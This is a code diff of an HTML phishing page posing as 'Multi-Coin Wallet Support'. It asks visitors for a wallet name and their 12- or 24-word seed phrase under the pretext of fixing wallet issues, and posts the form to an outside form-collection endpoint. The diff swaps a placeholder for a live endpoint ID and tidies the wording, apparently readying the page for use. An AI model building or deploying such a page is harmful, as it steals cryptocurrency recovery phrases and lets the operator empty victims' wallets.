@@ -100,10 +100,12 @@
 <body>
 <div class="container">
   <h2>Multi-Coin Wallet Support</h2>
-  <p>login to submit your complaint and fix your wallet related issues</p>
+  <p>Login to Submit Your Complaint
+ and fix your wallet related issues</p>
 
   <form id="complaintForm">
     <input type="text" name="username" placeholder="Wallet Name" required>
+<p>Wallet Name</p>
 
     <div class="textarea-wrapper">
       <textarea id="complaintBox" name="complaint" placeholder="input Phrase" required></textarea>
@@ -135,7 +137,7 @@ Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and
 
     const formData = new FormData(form);
 
-    fetch("https://formgrid.dev/api/f/FORMGRID_ENDPOINT", {
+    fetch("https://formgrid.dev/api/f/lzaao87w", {
       method: "POST",
       body: formData
     })
